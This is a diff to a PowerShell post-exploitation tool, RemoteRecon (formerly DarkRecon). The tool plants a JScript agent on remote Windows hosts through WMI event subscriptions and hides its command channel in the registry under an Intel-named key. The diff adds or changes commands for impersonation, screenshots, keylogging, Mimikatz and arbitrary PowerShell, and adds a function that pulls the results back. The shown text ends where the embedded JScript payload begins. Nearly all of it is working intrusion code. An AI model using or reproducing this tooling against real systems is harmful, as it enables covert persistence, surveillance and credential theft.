@@ -74,17 +74,17 @@ function Install-RemoteRecon {
     $HKEY_LOCAL_MACHINE = [UInt32]2147483650
     $RegistryPath = $RegistryPath.Replace('\', '\\')
 
-    #Setup the registry keys for DarkRecon C2
+    #Setup the registry keys for RemoteRecon C2
     $wmiArgs['Namespace'] = 'root\default'
     $wmiArgs['Class'] = 'StdRegProv'
     $wmiArgs['Name'] = "CreateKey"
     $wmiArgs['ArgumentList'] = $HKEY_LOCAL_MACHINE,$RegistryPath
 
-    Write-Verbose "[+] Setting up registry keys for DarkRecon C2"
+    Write-Verbose "[+] Setting up registry keys for RemoteRecon C2"
     $result = Invoke-WmiMethod @wmiArgs @commonArgs
 
     if ($result.ReturnValue -ne 0) {
-        Write-Verbose "[-] Unable to create registry key for DarkRecon"
+        Write-Verbose "[-] Unable to create registry key for RemoteRecon"
         $result
         break
     }
@@ -100,7 +100,8 @@ function Install-RemoteRecon {
         break
     }
 
-    $wmiArgs['ArgumentList'] = $HKEY_LOCAL_MACHINE,$RegistryPath,"",$CommandKey
+    $wmiArgs['Name'] = "SetDWORDValue"
+    $wmiArgs['ArgumentList'] = $HKEY_LOCAL_MACHINE,$RegistryPath,$CommandKey,0
 
     $result = Invoke-WmiMethod @wmiArgs @commonArgs
 
@@ -110,6 +111,7 @@ function Install-RemoteRecon {
         break
     }
 
+    $wmiArgs['Name'] = "SetStringValue"
     $wmiArgs['ArgumentList'] = $HKEY_LOCAL_MACHINE,$RegistryPath,"",$CommandArgsKey
 
     $result = Invoke-WmiMethod @wmiArgs @commonArgs
@@ -120,7 +122,8 @@ function Install-RemoteRecon {
         break
     }
 
-    $wmiArgs['ArgumentList'] = $HKEY_LOCAL_MACHINE,$RegistryPath,"",$ResultsKey
+    $wmiArgs['Name'] = "SetDWORDValue"
+    $wmiArgs['ArgumentList'] = $HKEY_LOCAL_MACHINE,$RegistryPath,$ResultsKey,0
 
     $result = Invoke-WmiMethod @wmiArgs @commonArgs
 
@@ -130,6 +133,7 @@ function Install-RemoteRecon {
         break
     }
 
+    $wmiArgs['Name'] = "SetStringValue"
     $wmiArgs['ArgumentList'] = $HKEY_LOCAL_MACHINE,$RegistryPath,"",$ScreenShotKey
 
     $result = Invoke-WmiMethod @wmiArgs @commonArgs
@@ -150,7 +154,7 @@ function Install-RemoteRecon {
         break
     }
 
-    #Setup the Remote Wmi event subscription
+    #Setup the Remote Wmi event subscription to trigger Remote Recon Execution
     $EventFilterArgs = @{
         EventNamespace = 'root\cimv2'
         Name = $FilterName
@@ -163,18 +167,18 @@ function Install-RemoteRecon {
     Write-Verbose "[+] Installing the filter"
     $Filter = Set-WmiInstance -Namespace "root\subscription" -Class "__EventFilter" -Arguments $EventFilterArgs @commonArgs
 
-    $DarkReconJS = $DarkReconJS -replace 'BASE_PATH',$RegistryPath
-    $DarkReconJS = $DarkReconJS -replace 'INIT_KEY',$RunKey
-    $DarkReconJS = $DarkReconJS -replace 'COMMAND_KEY',$CommandKey
-    $DarkReconJS = $DarkReconJS -replace 'COMMAND_ARG_KEY',$CommandArgsKey
-    $DarkReconJS = $DarkReconJS -replace 'COMMAND_RESULT_KEY',$ResultsKey
-    $DarkReconJS = $DarkReconJS -replace 'SCSTORE_KEY',$ScreenShotKey
-    $DarkReconJS = $DarkReconJS -replace 'KLSTORE_KEY',$KeylogKey
+    $RemoteReconJS = $RemoteReconJS -replace 'BASE_PATH',$RegistryPath
+    $RemoteReconJS = $RemoteReconJS -replace 'INIT_KEY',$RunKey
+    $RemoteReconJS = $RemoteReconJS -replace 'COMMAND_KEY',$CommandKey
+    $RemoteReconJS = $RemoteReconJS -replace 'COMMAND_ARG_KEY',$CommandArgsKey
+    $RemoteReconJS = $RemoteReconJS -replace 'COMMAND_RESULT_KEY',$ResultsKey
+    $RemoteReconJS = $RemoteReconJS -replace 'SCSTORE_KEY',$ScreenShotKey
+    $RemoteReconJS = $RemoteReconJS -replace 'KLSTORE_KEY',$KeylogKey
 
     $ActiveScriptEventConsumerArgs = @{
         Name = $ConsumerName
         ScriptingEngine = 'JScript'
-        ScriptText = $DarkReconJS
+        ScriptText = $RemoteReconJS
     }
 
     Write-Verbose "[+] Installing the ActiveScriptEventConsumer"
@@ -192,7 +196,7 @@ function Install-RemoteRecon {
     Start-Sleep -Seconds 10
     $FilterToConsumerBinding = Set-WmiInstance -Namespace "root\subscription" -Class "__FilterToConsumerBinding" -Arguments $FilterToConsumerArgs @commonArgs
 
-    Write-Verbose "[+] Triggering DarkRecon execution via the registry on $ComputerName"
+    Write-Verbose "[+] Triggering RemoteRecon execution via the registry on $ComputerName"
 
     Start-Sleep -Seconds 10
 
@@ -201,11 +205,11 @@ function Install-RemoteRecon {
     $result = Invoke-WmiMethod @wmiArgs @commonArgs
 
     if ($result.ReturnValue -ne 0) {
-        Write-Verbose "[-] Unable to set registry value for $RunKey and trigger DarkRecon execution"
+        Write-Verbose "[-] Unable to set registry value for $RunKey and trigger RemoteRecon execution"
         break
     }
 
-    Write-Verbose "[+] DarkRecon started"
+    Write-Verbose "[+] RemoteRecon started"
 
     Write-Verbose "[+] Cleaning up the subscription"
     Start-Sleep -Seconds 5
@@ -230,7 +234,9 @@ function Install-RemoteRecon {
     $OutputObject
 }
 
-function Invoke-DarkReconCmd {
+#DEBUG LINE
+#Install-RemoteRecon -Verbose
+function Invoke-RemoteReconCmd {
     <#
     .SYNOPSIS
     Short description
@@ -265,36 +271,32 @@ function Invoke-DarkReconCmd {
 
         [parameter(Mandatory=$true, ParameterSetName='Impersonate')]
         [ValidateNotNullOrEmpty()]
-        [int]$ProcessId,
+        [int]$ImpersonatePID,
 
         [parameter(Mandatory=$true, ParameterSetName='Screenshot')]
         [switch]$Screenshot,
 
         [parameter(Mandatory=$false, ParameterSetName='Screenshot')]
         [ValidateNotNullOrEmpty()]
-        [string]$ImagePath = "$pwd\$(Get-Date -f 'yyyy-mm-dd-hh-mm-ss').png",
+        [int]$ScreenshotPID,
 
         [parameter(Mandatory=$true, ParameterSetName='Keylog')]
-        [switch]$keylog,
+        [switch]$Keylog,
 
         [parameter(Mandatory=$false, ParameterSetName='Keylog')]
-        [switch]$Watch,
-
-        [parameter(Mandatory=$false, ParameterSetName='Keylog')]
-        [ValidateNotNullOrEmpty()]
-        [int]$Interval,
+        [int]$KeylogPID,
 
         [parameter(Mandatory=$true, ParameterSetName='Mimikatz')]
         [switch]$Mimikatz,
 
-        [parameter(Mandatory=$true, ParameterSetName='MimikatzCommand')]
+        [parameter(Mandatory=$true, ParameterSetName='Mimikatz')]
         [ValidateNotNullOrEmpty()]
         [string]$MimikatzCommand,
 
         [parameter(Mandatory=$true, ParameterSetName='PowerShell')]
         [switch]$PowerShell,
 
-        [parameter(Mandatory=$true, ParameterSetName='PowerShellCommand')]
+        [parameter(Mandatory=$true, ParameterSetName='PowerShell')]
         [ValidateNotNullOrEmpty()]
         [string]$PowerShellCommand,
 
@@ -307,11 +309,7 @@ function Invoke-DarkReconCmd {
 
         [parameter(Mandatory=$false)]
         [ValidateNotNullOrEmpty()]
-        [string]$RegistryPath = "SOFTWARE\\Intel\\PSIS",
-
-        [parameter(Mandatory=$false)]
-        [ValidateNotNullOrEmpty()]
-        [int]$Timeout = 10
+        [string]$RegistryPath = "SOFTWARE\\Intel\\PSIS"
     )
 
     $wmiArgs = @{}
@@ -321,12 +319,12 @@ function Invoke-DarkReconCmd {
     $RegistryPath = $RegistryPath.Replace('\', '\\')
 
     #Yes I'm lazy. I declared all the key values here. So what.
-    $RunKey = "DRun"
-    $CommandKey = "DCommand"
-    $CommandArgsKey = "DArgs"
-    $ResultsKey = "DResult"
-    $ScreenShotKey = "DScreenshot"
-    $KeylogKey = "DKeylog"
+    $RunKey = "Run"
+    $CommandKey = "Command"
+    $CommandArgsKey = "Args"
+    $ResultsKey = "Result"
+    $ScreenShotKey = "Screenshot"
+    $KeylogKey = "Keylog"
 
     #Credentials will not work for local Wmi commands
     if ($PSBoundParameters['ComputerName'] -and ($PSBoundParameters['ComputerName'] -ne '.' -or $PSBoundParameters['ComputerName'] -ne 'localhost' -or $PSBoundParameters['ComputerName'] -ne '127.0.0.1')) {
@@ -347,10 +345,11 @@ function Invoke-DarkReconCmd {
 
     $returnObject = New-Object -TypeName PSObject
     $returnObject | Add-Member -MemberType 'NoteProperty' -Name 'ComputerName' -Value $ComputerName
+    $returnObject | Add-Member -MemberType 'NoteProperty' -Name 'RegistryPath' -Value $RegistryPath
+    $returnObject | Add-Member -MemberType 'NoteProperty' -Name 'CommandKey' -Value $CommandKey
+    $returnObject | Add-Member -MemberType 'NoteProperty' -Name 'CommandArgsKey' -Value $CommandArgsKey
     $returnObject | Add-Member -MemberType 'NoteProperty' -Name 'Command' -Value ''
     $returnObject | Add-Member -MemberType 'NoteProperty' -Name 'CommandArguments' -Value ''
-    $returnObject | Add-Member -MemberType 'NoteProperty' -Name 'Result' -Value ''
-    $returnObject | Add-Member -MemberType 'NoteProperty' -Name 'CommandResult' -Value ''
 
     switch ($PSCmdlet.ParameterSetName) {
         'Impersonate' {
@@ -361,39 +360,34 @@ function Invoke-DarkReconCmd {
             Write-Verbose "[+] Sending impersonate command arguments"
             $result = Invoke-WmiMethod @wmiArgs @commonArgs
             if ($result.ReturnValue -ne 0) {
-                Write-Verbose "[-] Unable to issue impersonate command."
+                Write-Warning "[-] Unable to issue impersonate command."
             }
             
             #send the command 
-            $wmiArgs['ArgumentList'] = $HKEY_LOCAL_MACHINE,$RegistryPath,"impersonate",$CommandKey
+            $wmiArgs['Name'] = "SetDWORDValue"
+            $wmiArgs['ArgumentList'] = $HKEY_LOCAL_MACHINE,$RegistryPath,$CommandKey,1
             $returnObject.Command = "impersonate"
             Write-Verbose "[+] Sending impersonate command"
             $result = Invoke-WmiMethod @wmiArgs @commonArgs
             if ($result.ReturnValue -ne 0) {
                 Write-Warning "[-] Unable to issue impersonate command."
             }
-
-            Start-Sleep -Seconds $Timeout
-
-            Write-Verbose "[+] Retrieving command result"
-            $wmiArgs['Name'] = 'GetStringValue'
-            $wmiArgs['ArgumentList'] = $HKEY_LOCAL_MACHINE,$RegistryPath,$ResultsKey
-
-            $result = Invoke-WmiMethod @wmiArgs @commonArgs
-
-            if ($result.ReturnValue -ne 0) {
-                Write-Warning "[-] Unable to obtain command result"
-            }
-            else {
-                $returnObject.Result = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String($result.sValue))
-            }
-
-            $returnObject
         }
 
         'Screenshot' {
+
+            # Send the command argument first so it isn't missed when the agent picks up the command
+            $wmiArgs['ArgumentList'] = $HKEY_LOCAL_MACHINE,$RegistryPath,"$ProcessId",$CommandArgsKey
+            $returnObject.CommandArguments = $ProcessId
+            Write-Verbose "[+] Sending impersonate command arguments"
+            $result = Invoke-WmiMethod @wmiArgs @commonArgs
+            if ($result.ReturnValue -ne 0) {
+                Write-Warning "[-] Unable to issue impersonate command."
+            }
+
             #send the command 
-            $wmiArgs['ArgumentList'] = $HKEY_LOCAL_MACHINE,$RegistryPath,"screenshot",$CommandKey
+            $wmiArgs['Name'] = "SetDWORDValue"
+            $wmiArgs['ArgumentList'] = $HKEY_LOCAL_MACHINE,$RegistryPath,$CommandKey,3
             $returnObject.Command = "screenshot"
             Write-Verbose "[+] Sending screenshot command"
             $result = Invoke-WmiMethod @wmiArgs @commonArgs
@@ -401,46 +395,159 @@ function Invoke-DarkReconCmd {
                 Write-Warning "[-] Unable to issue screenshot command."
             }
 
-            #Wait the timeout period to retrieve the result
-            Start-Sleep -Seconds $Timeout
-            Write-Verbose "[+] Retrieving command result"
-            $wmiArgs['Name'] = 'GetStringValue'
-            $wmiArgs['ArgumentList'] = $HKEY_LOCAL_MACHINE,$RegistryPath,$ResultsKey
-
-            $result = Invoke-WmiMethod @wmiArgs @commonArgs
-
-            if ($result.ReturnValue -ne 0) {
-                Write-Warning "[-] Unable to obtain command result"
-            }
-            else {
-                $result = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String($result.sValue))
-                if ($result -contains "success") {
-                    $returnObject.Result = $result 
-
-                    $wmiArgs['ArgumentList'] = $HKEY_LOCAL_MACHINE,$RegistryPath,$ScreenShotKey
-                    $result = Invoke-WmiMethod @wmiArgs @commonArgs
-
-                    if ($result.ReturnValue -eq 0) {
-                        $imageBytes = [Convert]::FromBase64String($result.sValue)
-                        [System.IO.File]::WriteAllBytes($ImagePath, $imageBytes)
-
-                        $returnObject.CommandResult = (Get-ChildItem -Path $ImagePath).FullName
-                    }
-                }
-                else {
-                    $returnObject.Result = $result
-                }
-
-                $returnObject
-            }
         }
         'Keylog' {
-             $wmiArgs['ArgumentList'] = $HKEY_LOCAL_MACHINE,$RegistryPath,"keylog",$CommandKey
+             #$wmiArgs['ArgumentList'] = $HKEY_LOCAL_MACHINE,$RegistryPath,"keylog",$CommandKey
         }
     }
+
+    $returnObject
 }
 
-$DarkReconJS = @'
+function Get-ReconResult {
+    <#
+    .SYNOPSIS
+    Short description
+    
+    .DESCRIPTION
+    Long description
+    
+    .EXAMPLE
+    An example
+    
+    .NOTES
+    General notes
+    #>
+
+    [CmdletBinding()]
+    param
+    (
+        [parameter(Mandatory=$false)]
+        [ValidateNotNullOrEmpty()]
+        [string]$ComputerName,
+
+        [parameter(Mandatory=$false)]
+        [ValidateNotNullOrEmpty()]
+        [string]$Username,
+
+        [parameter(Mandatory=$false)]
+        [ValidateNotNullOrEmpty()]
+        [string]$Password,
+
+        [parameter(Mandatory=$true, ParameterSetName = "Impersonate")]
+        [switch]$Impersonate,
+
+        [parameter(Mandatory=$true, ParameterSetName = "Screenshot")]
+        [switch]$Screenshot,
+
+        [parameter(Mandatory=$false, ParameterSetName = "Screenshot")]
+        [ValidateNotNullOrEmpty()]
+        [string]$FilePath = "$((Get-Location).Path)\$(Get-Date -f 'yyyy-mm-dd-hh-mm-ss').png",
+
+        [parameter(Mandatory=$true, ParameterSetName = "Keylog")]
+        [switch]$Keylog,
+
+        [parameter(Mandatory=$false, ParameterSetName = "Keylog")]
+        [switch]$Watch,
+
+        [parameter(Mandatory=$false, ParameterSetName = "Keylog")]
+        [ValidateNotNullOrEmpty()]
+        [int]$Interval,
+
+        [parameter(Mandatory=$true, ParameterSetName = "PowerShell")]
+        [switch]$PowerShell,
+
+        [parameter(Mandatory=$false)]
+        [ValidateNotNullOrEmpty()]
+        [string]$RegistryPath = "SOFTWARE\\Intel\\PSIS"
+
+    )
+
+    $wmiArgs = @{}
+    $commonArgs = @{}
+
+    $HKEY_LOCAL_MACHINE = [UInt32]2147483650
+    $RegistryPath = $RegistryPath.Replace('\', '\\')
+
+    $RunKey = "Run"
+    $ResultsKey = "Result"
+    $ScreenShotKey = "Screenshot"
+    $KeylogKey = "Keylog"
+
+    if ($PSBoundParameters['ComputerName'] -and ($PSBoundParameters['ComputerName'] -ne '.' -or $PSBoundParameters['ComputerName'] -ne 'localhost' -or $PSBoundParameters['ComputerName'] -ne '127.0.0.1')) {
+        $commonArgs['ComputerName'] = $ComputerName
+
+        if ($PSBoundParameters['Username'] -and $PSBoundParameters['Password']) {
+            $secPassword = $Password | ConvertTo-SecureString -AsPlainText -Force
+            $credential = New-Object System.Management.Automation.PSCredential $Username,$secPassword
+            $commonArgs['Credential'] = $credential
+        }
+    }
+
+    $wmiArgs = @{
+        Namespace = 'root\default'
+        Class = 'StdRegProv'
+        Name = 'GetDWORDValue'
+    }
+
+    $returnObject = New-Object -TypeName PSObject
+    $returnObject | Add-Member -MemberType 'NoteProperty' -Name 'ComputerName' -Value $ComputerName
+    $returnObject | Add-Member -MemberType 'NoteProperty' -Name 'RegistryPath' -Value $RegistryPath
+    $returnObject | Add-Member -MemberType 'NoteProperty' -Name 'ResultKey' -Value $ResultsKey
+    $returnObject | Add-Member -MemberType 'NoteProperty' -Name 'ReturnCode' -Value ''
+    $returnObject | Add-Member -MemberType 'NoteProperty' -Name 'Output' -Value ''
+
+    switch ($PSCmdlet.ParameterSetName) {
+        "Impersonate" { 
+            $wmiArgs['ArgumentList'] = $HKEY_LOCAL_MACHINE,$RegistryPath,$ResultsKey
+            $result = Invoke-WmiMethod @wmiArgs @commonArgs
+            if ($result.ReturnValue -ne 0) {
+                Write-Warning "[-] Unable to obtain result for Impersonate command"
+            }
+            else {
+                $returnObject.ReturnCode = $result.sValue
+
+                $wmiArgs['Name'] = "GetStringValue"
+                $wmiArgs['ArgumentList'] = $HKEY_LOCAL_MACHINE,$RegistryPath,$RunKey
+                $result = Invoke-WmiMethod @wmiArgs @commonArgs
+                if ($result.ReturnValue -ne 0) {
+                    Write-Warning "[-] Unable to obtain output for Impersonate command"
+                }
+
+                $returnObject.Output = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String($result.sValue))
+            }
+         }
+        "Screenshot" {
+            $wmiArgs['ArgumentList'] = $HKEY_LOCAL_MACHINE,$RegistryPath,$ResultsKey
+            $result = Invoke-WmiMethod @wmiArgs @commonArgs
+            if ($result.ReturnValue -ne 0) {
+                Write-Warning "[-] Unable to obtain result for Impersonate command"
+            }
+            else {
+                $returnObject.ReturnCode = $result.sValue
+
+                $wmiArgs['Name'] = "GetStringValue"
+                $wmiArgs['ArgumentList'] = $HKEY_LOCAL_MACHINE,$RegistryPath,$ScreenShotKey
+                $result = Invoke-WmiMethod @wmiArgs @commonArgs
+                if ($result.ReturnValue -ne 0) {
+                    Write-Warning "[-] Unable to obtain output for Impersonate command"
+                }
+
+                if ($result.sValue -ne $null) {
+                    $png = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String($result.sValue))
+                    Set-Content -Path $FilePath -Encoding Byte -Value $png
+                    $returnObject.Output = Get-ChildItem -Path $FilePath
+                }
+                
+            }
+        }
+        Default {}
+    }
+
+    $returnObject
+}
+
+$RemoteReconJS = @'
 function setversion() {
     var shell = new ActiveXObject('WScript.Shell');
     ver = 'v4.0.30319';
